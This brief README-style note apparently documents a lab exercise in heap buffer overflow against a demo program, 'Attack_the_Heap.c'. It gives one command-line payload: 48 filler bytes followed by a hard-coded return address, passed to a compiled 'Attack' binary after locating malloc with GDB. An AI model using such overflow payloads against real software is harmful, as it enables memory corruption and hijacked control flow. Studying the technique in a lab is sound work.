Example of heap exploitation and buffer overflow against memory allocation (malloc)

Use GDB to find memory location of malloc

Example:

Use compiled attack file on "Attack_the_Heap.c"

./Attack `python2 -c "print 'A'*48 + '\xA6\x91\x04\x08'"`

